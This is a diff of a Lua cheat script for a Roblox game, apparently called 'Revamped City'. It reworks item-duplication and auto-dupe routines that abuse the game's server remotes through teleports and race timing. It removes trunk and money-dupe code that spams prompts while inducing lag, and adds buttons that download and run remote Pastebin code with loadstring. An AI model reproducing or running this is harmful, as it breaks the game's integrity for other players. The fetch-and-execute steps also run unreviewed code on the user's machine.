@@ -837,18 +837,20 @@
 
 -- Recovery
     local recoveryTab = Window:Tab({ Text = "Recovery" })
-    local DupeSection = recoveryTab:Section({ Text = "Dupe" })
-    local player = game:GetService("Players").LocalPlayer
+local DupeSection = recoveryTab:Section({ Text = "Dupe" })
+local player = game:GetService("Players").LocalPlayer
 
-    -- GUI setup for cooldown
-    local cooldownUI = nil
-    local cooldownLabel = nil
+-- Cooldown GUI setup
+local cooldownUI, cooldownLabel
 
-    local function createCooldownUI()
-	local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+local function createCooldownUI()
+	if cooldownUI then return end
+
+	local screenGui = Instance.new("ScreenGui")
 	screenGui.Name = "CooldownGUI"
 	screenGui.ResetOnSpawn = false
-	screenGui.Enabled = false
+	screenGui.IgnoreGuiInset = true
+	screenGui.Parent = player:WaitForChild("PlayerGui")
 
 	local frame = Instance.new("Frame", screenGui)
 	frame.Size = UDim2.new(0, 120, 0, 30)
@@ -862,7 +864,6 @@
 
 	local label = Instance.new("TextLabel", frame)
 	label.Size = UDim2.new(1, 0, 1, 0)
-	label.Position = UDim2.new(0, 0, 0, 0)
 	label.BackgroundTransparency = 1
 	label.TextColor3 = Color3.fromRGB(255, 255, 255)
 	label.Font = Enum.Font.GothamBold
@@ -872,19 +873,21 @@
 
 	cooldownUI = screenGui
 	cooldownLabel = label
-    end
+end
 
-    local function showCooldownUI()
-	if not cooldownUI then createCooldownUI() end
+local function showCooldownUI()
+	createCooldownUI()
 	cooldownUI.Enabled = true
-    end
+end
 
-    local function hideCooldownUI()
-	if cooldownUI then cooldownUI.Enabled = false end
-    end
+local function hideCooldownUI()
+	if cooldownUI then
+		cooldownUI.Enabled = false
+	end
+end
 
-    -- TriggerSeat teleport method
-    local function TriggerSeat()
+-- Teleport with TriggerSeat
+local function TriggerSeat()
 	local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
 	if humanoid then
 		for _, obj in pairs(workspace:GetDescendants()) do
@@ -894,274 +897,173 @@
 			end
 		end
 	end
-    end
+end
 
-    local function teleportTo(position)
+local function teleportTo(position)
 	TriggerSeat()
-	wait(1)
-	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-		player.Character.HumanoidRootPart.CFrame = CFrame.new(position)
+	task.wait(1)
+	local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+	if hrp then
+		hrp.CFrame = CFrame.new(position)
 	end
 	local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
 	if humanoid then
 		humanoid.Sit = false
 	end
-    end
+end
 
-    -- Cooldown state
-    local isOnCooldown = false
-    local autoDupeEnabled = false
-    local autoDupeTask = nil
+-- Dupe logic
+local isOnCooldown = false
+local autoDupeEnabled = false
+local autoDupeTask
+local storedTool = nil
+local AUTO_DUPE_COOLDOWN = 35
 
-    -- Normal dupe function
-    local function performDupe()
+local function performDupe(tool)
+	if not tool then
+		warn("[Revamped City] No tool equipped for dupe.")
+		return
+	end
+
+	local toolName = tool.Name
 	local character = player.Character or player.CharacterAdded:Wait()
-	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+	local hrp = character:FindFirstChild("HumanoidRootPart")
 	local backpack = player:WaitForChild("Backpack")
-
 	local safes = workspace["1# Map"]["2 Crosswalks"].Safes:GetChildren()
-	local closestSafe, closestChestClicker, shortestDistance = nil, nil, math.huge
+	local closestSafe, closestClicker, shortestDistance = nil, nil, math.huge
 
 	for _, safe in ipairs(safes) do
-		local chestClicker = safe:FindFirstChild("ChestClicker")
-		if chestClicker and chestClicker:IsA("BasePart") then
-			local distance = (humanoidRootPart.Position - chestClicker.Position).Magnitude
+		local clicker = safe:FindFirstChild("ChestClicker")
+		if clicker and clicker:IsA("BasePart") then
+			local distance = (hrp.Position - clicker.Position).Magnitude
 			if distance < shortestDistance then
 				shortestDistance = distance
 				closestSafe = safe
-				closestChestClicker = chestClicker
+				closestClicker = clicker
 			end
 		end
 	end
 
-	if not closestSafe or not closestChestClicker then
+	if not closestSafe or not closestClicker then
 		warn("[Revamped City] No nearby safe with ChestClicker found.")
 		return
 	end
 
-	local tool = character:FindFirstChildOfClass("Tool")
-	if not tool then
-		warn("[Revamped City] No tool equipped.")
-		return
-	end
-	local toolName = tool.Name
 	tool.Parent = backpack
-
-	teleportTo(closestChestClicker.Position + Vector3.new(0, 5, 0))
+	teleportTo(closestClicker.Position + Vector3.new(0, 5, 0))
 	task.wait(0.5)
 
-	task.spawn(function()
-		game:GetService("ReplicatedStorage").BackpackRemote:InvokeServer("Store", toolName)
-	end)
-
-	task.spawn(function()
-		game:GetService("ReplicatedStorage").Inventory:FireServer("Change", toolName, "Backpack", closestSafe)
-	end)
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	task.spawn(function() ReplicatedStorage.BackpackRemote:InvokeServer("Store", toolName) end)
+	task.spawn(function() ReplicatedStorage.Inventory:FireServer("Change", toolName, "Backpack", closestSafe) end)
 
 	task.wait(1.7)
-	game:GetService("ReplicatedStorage").BackpackRemote:InvokeServer("Grab", toolName)
+	ReplicatedStorage.BackpackRemote:InvokeServer("Grab", toolName)
 
 	game.StarterGui:SetCore("SendNotification", {
 		Title = "[Revamped City]",
 		Text = "Duped item stored!",
 		Duration = 2
 	})
-    end
+end
 
-    -- Trunk dupe helper
-    local function getCar()
-	local plrname = player.Name
-	for _, v in pairs(workspace.CivCars:GetDescendants()) do
-		if v:IsA("Model") and v:FindFirstChild("Owner") then
-			if v.Owner.Value == plrname then
-				return v
-			end
-		end
-	end
-    end
-
-    -- Trunk Dupe function
-    local function performTrunkDupe()
-	local character = player.Character
-	if character and character:FindFirstChildOfClass("Tool") then
-		local gunTool = character:FindFirstChildOfClass("Tool")
-		local gunName = gunTool.Name
-		local humanoid = character:FindFirstChildOfClass("Humanoid")
-		if humanoid then humanoid:UnequipTools() end
-
-		local car = getCar()
-		if not car or not car:FindFirstChild("Body") or not car.Body:FindFirstChild("TrunckStorage") then
-			warn("[Revamped City] No owned car found.")
-			return
-		end
-
-		local hrp = character:FindFirstChild("HumanoidRootPart")
-		if hrp then
-			hrp.CFrame = car.Body.TrunckStorage.CFrame + Vector3.new(2, 0, 0)
-		end
-
-		task.wait(0.5)
-		local ReplicatedStorage = game:GetService("ReplicatedStorage")
-		local BackpackRemote = ReplicatedStorage:WaitForChild("BackpackRemote")
-		local TrunkStorage = ReplicatedStorage:WaitForChild("TrunkStorage")
-		local InventoryRemote = ReplicatedStorage:WaitForChild("Inventory")
-
-		task.spawn(function()
-			BackpackRemote:InvokeServer("Store", gunName)
-		end)
-
-		task.spawn(function()
-			TrunkStorage:FireServer("Store", gunName)
-		end)
-
-		task.wait(0.5)
-
-		task.spawn(function()
-			InventoryRemote:FireServer("Change", gunName, "Backpack", nil)
-		end)
-
-		task.wait(1.5)
-		BackpackRemote:InvokeServer("Grab", gunName)
-
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "[Revamped City]",
-			Text = "Trunk dupe done.",
-			Duration = 2
-		})
-	else
-		warn("[Revamped City] No tool equipped for trunk dupe.")
-	end
-    end
-
-    -- Cooldown
-    local function startCooldown(seconds)
+local function startCooldown(seconds)
+	if isOnCooldown then return end
 	isOnCooldown = true
 	showCooldownUI()
+
 	for i = seconds, 1, -1 do
-		cooldownLabel.Text = "Cooldown: " .. i
+		if cooldownLabel then cooldownLabel.Text = "Cooldown: " .. i end
 		task.wait(1)
 	end
+
 	isOnCooldown = false
 	hideCooldownUI()
-    end
+end
 
-    -- GUI Buttons
-    DupeSection:Button({
+-- Manual Dupe function waits for tool, then dupes once
+local function manualDupe()
+	if isOnCooldown then
+		warn("[Revamped City] Dupe is on cooldown.")
+		return
+	end
+	game.StarterGui:SetCore("SendNotification", {
+		Title = "[Revamped City]",
+		Text = "Waiting for you to hold a tool...",
+		Duration = 3
+	})
+	while true do
+		local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
+		if tool then
+			performDupe(tool)
+			startCooldown(AUTO_DUPE_COOLDOWN)
+			break
+		end
+		task.wait(0.2)
+	end
+end
+
+-- AutoDupe task
+local function autoDupeLoop()
+	storedTool = nil
+	while autoDupeEnabled do
+		if not storedTool then
+			-- Wait until player holds a tool once, then store it
+			local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
+			if tool then
+				storedTool = tool
+				game.StarterGui:SetCore("SendNotification", {
+					Title = "[Revamped City]",
+					Text = "AutoDupe tool stored: " .. tool.Name,
+					Duration = 3
+				})
+				-- Reset cooldown so immediate dupe happens
+				isOnCooldown = false
+			end
+		else
+			if not isOnCooldown and storedTool then
+				-- Auto equip the tool
+				if storedTool.Parent ~= player.Character then
+					storedTool.Parent = player.Character
+				end
+
+				performDupe(storedTool)
+				startCooldown(AUTO_DUPE_COOLDOWN)
+			end
+		end
+		task.wait(1)
+	end
+	storedTool = nil
+end
+
+-- GUI Buttons
+DupeSection:Button({
 	Text = "Dupe Gun",
-	Callback = function()
-		if isOnCooldown then
-			warn("[Revamped City] Dupe on cooldown.")
-			return
-		end
-		task.spawn(function()
-			performDupe()
-			startCooldown(35)
-		end)
-	end
-    })
+	Callback = manualDupe
+})
 
-    DupeSection:Button({
-	Text = "Trunk Dupe",
-	Callback = function()
-		if isOnCooldown then
-			warn("[Revamped City] Trunk Dupe on cooldown.")
-			return
-		end
-		task.spawn(function()
-			performTrunkDupe()
-			startCooldown(20)
-		end)
-	end
-    })
-
-    DupeSection:Toggle({
+DupeSection:Toggle({
 	Text = "AutoDupe",
 	Callback = function(state)
 		autoDupeEnabled = state
+
 		if autoDupeEnabled then
-			if isOnCooldown then
-				warn("[Revamped City] Waiting for cooldown to finish before auto-duping...")
-				task.spawn(function()
-					while isOnCooldown do task.wait(0.5) end
-					if autoDupeEnabled then
-						autoDupeTask = task.spawn(function()
-							while autoDupeEnabled do
-								if not isOnCooldown then
-									performDupe()
-									startCooldown(35)
-								else
-									task.wait(1)
-								end
-							end
-						end)
-					end
-				end)
-			else
-				autoDupeTask = task.spawn(function()
-					while autoDupeEnabled do
-						if not isOnCooldown then
-							performDupe()
-							startCooldown(35)
-						else
-							task.wait(1)
-						end
-					end
-				end)
-			end
 			warn("[Revamped City] AutoDupe Enabled")
+			autoDupeTask = task.spawn(autoDupeLoop)
 		else
-			autoDupeEnabled = false
+			warn("[Revamped City] AutoDupe Disabled")
 			if autoDupeTask then
 				task.cancel(autoDupeTask)
 				autoDupeTask = nil
 			end
 			hideCooldownUI()
-			warn("[Revamped City] AutoDupe Disabled")
+			storedTool = nil
 		end
 	end
-    })
+})
 
     local MoneySection = recoveryTab:Section({ Text = "Money", Side = "Right" })
 
-    local player = game:GetService("Players").LocalPlayer
-
-    -- TriggerSeat teleport function
-    local function TriggerSeat()
-	local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
-	if humanoid then
-		for _, obj in pairs(workspace:GetDescendants()) do
-			if obj:IsA("Seat") or obj:IsA("VehicleSeat") then
-				obj:Sit(humanoid)
-				return
-			end
-		end
-	end
-    end
-
-    local function teleportTo(position)
-	TriggerSeat()
-	task.wait(1)
-	local character = player.Character
-	if character and character:FindFirstChild("HumanoidRootPart") then
-		character.HumanoidRootPart.CFrame = CFrame.new(position)
-	end
-	local humanoid = character and character:FindFirstChild("Humanoid")
-	if humanoid then
-		humanoid.Sit = false
-	end
-    end
-
-    -- Game lag function (simulated lag for potential bypass)
-    local function induceLag()
-	for i = 1, 10 do
-		task.spawn(function()
-			while task.wait() do end
-		end)
-	end
-    end
-
-
-    -- Button for Step 1: runs the loadstring from Pastebin
     MoneySection:Button({
     Text = "Step 1",
     Callback = function()
@@ -1174,241 +1076,30 @@
     end
     })
 
-
-    -- Helper to create a grey GUI message in the middle of the screen for 5 seconds
-    local function showMessage(text)
-	local screenGui = Instance.new("ScreenGui")
-	screenGui.Name = "MessageGui"
-	screenGui.ResetOnSpawn = false
-	screenGui.Parent = game:GetService("CoreGui")
-
-	local frame = Instance.new("Frame")
-	frame.Size = UDim2.new(0, 300, 0, 100)
-	frame.Position = UDim2.new(0.5, -150, 0.5, -50)
-	frame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-	frame.BackgroundTransparency = 0.3
-	frame.BorderSizePixel = 0
-	frame.AnchorPoint = Vector2.new(0.5, 0.5)
-	frame.Parent = screenGui
-
-	local textLabel = Instance.new("TextLabel")
-	textLabel.Size = UDim2.new(1, -20, 1, -20)
-	textLabel.Position = UDim2.new(0, 10, 0, 10)
-	textLabel.BackgroundTransparency = 1
-	textLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
-	textLabel.Font = Enum.Font.SourceSansBold
-	textLabel.TextSize = 24
-	textLabel.Text = text
-	textLabel.Parent = frame
-
-	task.delay(5, function()
-		screenGui:Destroy()
-	end)
+    MoneySection:Button({
+    Text = "Step 2",
+    Callback = function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("http://pastebin.com/raw/ndC2kNgP"))()
+        end)
+        if not success then
+            warn("Failed to load Step 2 script:", err)
+        end
     end
-
-    -- Step 2 button
-    MoneySection:Button({
-	Text = "Step 2",
-	Callback = function()
-		local function checkSell()
-			local backpack = player:WaitForChild("Backpack")
-			return backpack:FindFirstChild("Ice-Fruit Cupz") ~= nil
-		end
-
-		local character = player.Character or player.CharacterAdded:Wait()
-		local hrp = character and character:FindFirstChild("HumanoidRootPart")
-		if not (character and hrp) then return end
-
-		if not checkSell() then
-			warn("You do not have an Ice-Fruit Cupz!")
-			return
-		end
-
-		local originalCFrame = hrp.CFrame
-
-		local sellPart = workspace:FindFirstChild("IceFruit Sell")
-		local sellPrompt = sellPart and sellPart:FindFirstChild("ProximityPrompt")
-		if not (sellPart and sellPrompt) then return end
-
-		player.Character.Humanoid:EquipTool(player.Backpack:FindFirstChild("Ice-Fruit Cupz"))
-
-		-- Teleport to sell point
-		teleportTo(sellPart.Position)
-		task.wait(0.2)
-
-		-- Induce lag
-		induceLag()
-
-		-- Spam proximity prompt
-		for _ = 1, 2000 do
-			pcall(function()
-				fireproximityprompt(sellPrompt, 0)
-			end)
-		end
-
-		task.wait(1)
-
-		-- Return to original position
-		teleportTo(originalCFrame.Position)
-
-		-- Add styled UI Message at the end (like your example)
-		local playerGui = player:WaitForChild("PlayerGui")
-
-		local screenGui = Instance.new("ScreenGui")
-		screenGui.Name = "Step2MessageGui"
-		screenGui.ResetOnSpawn = false
-		screenGui.Parent = playerGui
-
-		local frame = Instance.new("Frame")
-		frame.Size = UDim2.new(0, 300, 0, 100)
-		frame.Position = UDim2.new(0.5, -150, 0.5, -50)
-		frame.BackgroundColor3 = Color3.fromRGB(85, 85, 85)
-		frame.BackgroundTransparency = 0
-		frame.BorderSizePixel = 0
-		frame.AnchorPoint = Vector2.new(0.5, 0.5)
-		frame.Parent = screenGui
-		frame.ClipsDescendants = true
-		frame.Rotation = 0
-		frame.AutomaticSize = Enum.AutomaticSize.None
-
-		local uICorner = Instance.new("UICorner")
-		uICorner.CornerRadius = UDim.new(0, 15)
-		uICorner.Parent = frame
-
-		local textLabel = Instance.new("TextLabel")
-		textLabel.Size = UDim2.new(1, -20, 1, -20)
-		textLabel.Position = UDim2.new(0, 10, 0, 10)
-		textLabel.BackgroundTransparency = 1
-		textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-		textLabel.TextScaled = true
-		textLabel.Font = Enum.Font.GothamBold
-		textLabel.Text = "Run Step 3"
-		textLabel.Parent = frame
-		textLabel.TextWrapped = true
-		textLabel.TextYAlignment = Enum.TextYAlignment.Center
-		textLabel.TextXAlignment = Enum.TextXAlignment.Center
-
-		task.delay(5, function()
-			if screenGui then
-				screenGui:Destroy()
-			end
-		end)
-	end
     })
 
     MoneySection:Button({
-	Text = "Step 3",
-	Callback = function()
-		local player = game:GetService("Players").LocalPlayer
-
-		local function TriggerSeat()
-			local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
-			if humanoid then
-				for _, obj in pairs(workspace:GetDescendants()) do
-					if obj:IsA("Seat") or obj:IsA("VehicleSeat") then
-						obj:Sit(humanoid)
-						return
-					end
-				end
-			end
-		end
-
-		local function teleportTo(position)
-			TriggerSeat()
-			task.wait(1)
-			local character = player.Character
-			if character and character:FindFirstChild("HumanoidRootPart") then
-				character.HumanoidRootPart.CFrame = CFrame.new(position)
-			end
-			local humanoid = character and character:FindFirstChild("Humanoid")
-			if humanoid then
-				humanoid.Sit = false
-			end
-		end
-
-		local function showGui(message, color)
-			local screenGui = Instance.new("ScreenGui")
-			screenGui.ResetOnSpawn = false
-			screenGui.Parent = player:WaitForChild("PlayerGui")
-
-			local frame = Instance.new("Frame")
-			frame.Size = UDim2.new(0, 350, 0, 120)
-			frame.Position = UDim2.new(0.5, -175, 0.5, -60)
-			frame.BackgroundColor3 = color
-			frame.BorderSizePixel = 0
-			frame.AnchorPoint = Vector2.new(0.5, 0.5)
-			frame.Parent = screenGui
-
-			local uICorner = Instance.new("UICorner")
-			uICorner.CornerRadius = UDim.new(0, 15)
-			uICorner.Parent = frame
-
-			local textLabel = Instance.new("TextLabel")
-			textLabel.Size = UDim2.new(1, -20, 1, -20)
-			textLabel.Position = UDim2.new(0, 10, 0, 10)
-			textLabel.BackgroundTransparency = 1
-			textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-			textLabel.TextScaled = true
-			textLabel.Font = Enum.Font.GothamBold
-			textLabel.Text = message
-			textLabel.TextWrapped = true
-			textLabel.TextYAlignment = Enum.TextYAlignment.Center
-			textLabel.TextXAlignment = Enum.TextXAlignment.Center
-			textLabel.Parent = frame
-
-			task.delay(5, function()
-				if screenGui then
-					screenGui:Destroy()
-				end
-			end)
-		end
-
-		-- Show 5-second grey GUI
-		showGui("Wash Money and Stuff Bag.\n\nRest Is Automated.", Color3.fromRGB(85, 85, 85))
-
-		-- TP to wash spot
-		teleportTo(Vector3.new(-988, 254, -689))
-
-		-- Wait for BagOfMoney
-		local backpack = player:WaitForChild("Backpack")
-		repeat task.wait(0.5) until backpack:FindFirstChild("BagOfMoney")
-
-		local tool = backpack:FindFirstChild("BagOfMoney")
-		if tool then
-			player.Character:WaitForChild("Humanoid"):EquipTool(tool)
-		end
-
-		-- TP to bank
-		teleportTo(Vector3.new(-203, 284, -1201))
-
-		local function getClosestPrompt()
-			local closest, shortest = nil, math.huge
-			for _, obj in pairs(workspace:GetDescendants()) do
-				if obj:IsA("ProximityPrompt") and obj.Parent:IsA("BasePart") then
-					local dist = (player.Character.HumanoidRootPart.Position - obj.Parent.Position).Magnitude
-					if dist < shortest then
-						closest = obj
-						shortest = dist
-					end
-				end
-			end
-			return closest
-		end
-
-		while backpack:FindFirstChild("BagOfMoney") or (player.Character and player.Character:FindFirstChild("BagOfMoney")) do
-			local prompt = getClosestPrompt()
-			if prompt then
-				pcall(function()
-					fireproximityprompt(prompt, 0)
-				end)
-			end
-			task.wait(0.2)
-		end
-
-		-- Show 5-second green GUI
-		showGui("Money Duped!", Color3.fromRGB(0, 200, 0))
-	end
+    Text = "Step 3",
+    Callback = function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/RnqJLmSW"))()
+        end)
+        if not success then
+            warn("Failed to load Step 3 script:", err)
+        end
+    end
     })
+
 
     
 --
